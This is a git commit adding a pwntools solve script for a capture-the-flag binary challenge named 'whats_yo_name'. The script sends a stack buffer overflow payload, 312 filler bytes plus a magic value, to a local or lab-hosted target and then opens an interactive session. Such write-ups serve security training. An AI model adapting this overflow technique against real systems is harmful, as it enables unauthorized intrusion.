991a31fc437033258edb9dd519f68aa5fd662fe7
Ayaanhusain <50568156+Ayaanhusain@users.noreply.github.com>
2026-09-19 12:00:40 +0530

    Update solve.py

--- pwn/whats_yo_name/solve.py
+++ pwn/whats_yo_name/solve.py
@@ -1,1 +1,21 @@
+from pwn import *
 
+context.binary = elf = ELF('./chal')
+context.log_level = 'info'
+
+def start():
+    if args.REMOTE:
+        return remote('10.21.232.223', 59440)   # your port here
+    return process('./chal')
+
+p = start()
+
+magic = 0xff293a6365737963
+payload = b'A' * 312 + p64(magic)
+
+p.recvuntil(b'Enter you Customer ID : ')
+p.sendline(b'0')
+p.recvuntil(b'Enter your Username : ')
+p.sendline(payload)
+
+p.interactive()
